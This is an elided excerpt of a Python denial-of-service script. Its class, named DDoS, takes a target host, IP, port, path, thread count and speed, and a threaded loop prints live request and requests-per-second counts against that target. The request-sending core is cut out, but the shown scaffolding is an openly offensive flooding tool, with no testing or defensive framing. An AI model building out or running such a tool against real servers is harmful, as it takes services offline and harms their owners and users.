...
def argParse():
    ...
    parser.add_argument('-s', metavar='MS', dest='speed', help='Speed of connecting in ms (default=50)', type=int, default=50, required=False)
    args = parser.parse_args()

#Class
class DDoS:
    #Init
    def __init__(self, host, ip, port, path, threads, speed):
        #Self vars
        self.host = host
        self.ip = ip
        self.port = port
        ...
        while self.threadEvent.isSet():
            try:
                ...
                self.timeSec += 1/10
                if self.path == '/':
                    print(f'+Request #{self.requestCount} / {round(self.timeSec, 1)} Secs / {self.sentSec} Requests/s / {self.works} Workers ~ {self.ip}@{self.port} -> {self.host}')
                else:
                    print(f'+Request #{self.requestCount} / {round(self.timeSec, 1)} Secs / {self.sentSec} Requests/s / {self.works} Workers ~ {self.ip}@{self.port} -> {self.host}/{self.path[1:]}')
            #Ctrl+C
            except KeyboardInterrupt:
                print('Ctrl+C')
                self.threadEvent.clear()
...
if __name__ == '__main__':
    argParse()
    DDoS(args.host, args.ip, args.port, args.path, args.threads, args.speed)
